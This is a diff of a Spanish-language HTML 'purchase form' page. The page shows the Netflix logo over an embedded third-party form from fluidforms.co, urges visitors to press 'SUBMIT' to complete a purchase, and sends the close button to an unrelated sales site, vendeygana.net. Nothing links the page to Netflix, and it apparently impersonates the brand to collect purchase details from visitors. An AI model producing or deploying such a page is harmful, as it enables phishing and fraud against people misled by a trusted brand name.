@@ -3,143 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulario de Compra</title>
+    <title>Ventana Embed</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+            background-color: #f0f0f0;
         }
-
-        header {
-            width: 100%;
-            background-color: #141414;
-            padding: 20px 0;
-            text-align: center;
-        }
-
-        .logo {
-            max-height: 50px;
-        }
-
-        .modal {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: fixed;
-            z-index: 1;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            overflow: auto;
-            background-color: rgba(0,0,0,0.4);
-        }
-
-        .modal-content {
-            background-color: #fff;
-            padding: 20px;
-            border: 2px solid #ed7318;
-            width: 90%;
-            max-width: 600px;
-            text-align: center;
+        .frame-container {
             position: relative;
-            box-sizing: border-box;
+            border: 5px solid #ed7318;
+            padding: 20px;
+            background-color: white;
+            text-align: center;
         }
-
-        .modal-header {
-            margin-bottom: 20px;
-        }
-
-        .modal-logo {
-            max-height: 50px;
-            display: block;
-            margin: 0 auto;
-        }
-
-        #close-form-modal, #close-thank-you-modal {
-            margin-top: 10px;
-            padding: 10px 20px;
-            background-color: #e50914;
-            color: #fff;
+        .frame-container .close-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #ed7318;
+            color: white;
             border: none;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
             cursor: pointer;
         }
-
-        .form-frame {
-            width: 100%;
-            height: 500px;
+        .frame-container img {
+            display: block;
+            margin: 0 auto 10px auto;
+            width: 100px; /* Ajusta el tamaño del logo según sea necesario */
+        }
+        .frame-container iframe {
+            width: 600px;
+            height: 400px;
             border: none;
         }
+        .purchase-message {
+            margin-top: 10px;
+            color: #ed7318;
+            font-weight: bold;
+        }
     </style>
-</head>
-<body>
-    <header>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Logo de Netflix" class="logo">
-    </header>
-    <div id="form-modal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Logo de Netflix" class="modal-logo">
-            </div>
-            <iframe src="https://www.fluidforms.co/embed/form?id=679a1fda7f67fda4582268e8" frameborder="0" class="form-frame"></iframe>
-        </div>
-    </div>
-    <div id="thank-you-modal" class="modal" style="display: none;">
-        <div class="modal-content">
-            <p>Gracias por su compra</p>
-            <button id="close-thank-you-modal">Cerrar</button>
-        </div>
-    </div>
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            const thankYouModal = document.getElementById('thank-you-modal');
-            const closeThankYouModalButton = document.getElementById('close-thank-you-modal');
-            const iframe = document.querySelector('.form-frame');
+        function redirectTo() {
+            window.location.href = "https://www.vendeygana.net/user/";
+        }
 
-            // Function to show the thank you modal
-            function showThankYouModal() {
-                thankYouModal.style.display = 'block';
-            }
-
-            // Close the thank you modal
-            closeThankYouModalButton.addEventListener('click', function() {
-                thankYouModal.style.display = 'none';
-            });
-
-            // Listen for changes in the iframe
-            iframe.addEventListener('load', function() {
+        function translateIframe() {
+            const iframe = document.querySelector('iframe');
+            iframe.onload = () => {
                 const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
-
-                // Create a MutationObserver to detect changes in the iframe DOM
-                const observer = new MutationObserver(function(mutations) {
-                    mutations.forEach(function(mutation) {
-                        if (mutation.type === 'childList') {
-                            // Check if the thank you message is present in the iframe
-                            const thankYouMessage = iframeDocument.body.textContent.includes('GRACIAS POR TU ENVIO');
-                            if (thankYouMessage) {
-                                showThankYouModal();
-                            }
-                        }
-                    });
+                // Ejemplo de traducción de algunos elementos
+                iframeDocument.querySelectorAll('button').forEach(button => {
+                    if (button.innerText === 'Submit') {
+                        button.innerText = 'Enviar';
+                    }
                 });
-
-                // Start observing the body of the iframe for changes
-                observer.observe(iframeDocument.body, { childList: true, subtree: true });
-
-                // Listen for the form submit event directly (fallback method)
-                const form = iframeDocument.querySelector('form');
-                if (form) {
-                    form.addEventListener('submit', function(event) {
-                        setTimeout(showThankYouModal, 1000); // Assuming the form submission takes 1 second
-                    });
-                }
-            });
-        });
+                iframeDocument.querySelectorAll('input[type="submit"]').forEach(button => {
+                    if (button.value === 'Submit') {
+                        button.value = 'Enviar';
+                    }
+                });
+                // Agrega más traducciones según sea necesario
+            };
+        }
     </script>
+</head>
+<body onload="translateIframe()">
+    <div class="frame-container">
+        <button class="close-button" onclick="redirectTo()">X</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo">
+        <iframe src="https://www.fluidforms.co/embed/form?id=679a1fda7f67fda4582268e8" allowfullscreen></iframe>
+        <p class="purchase-message">Dale al botón: “SUBMIT” para REALIZAR LA COMPRA</p>
+    </div>
 </body>
 </html>
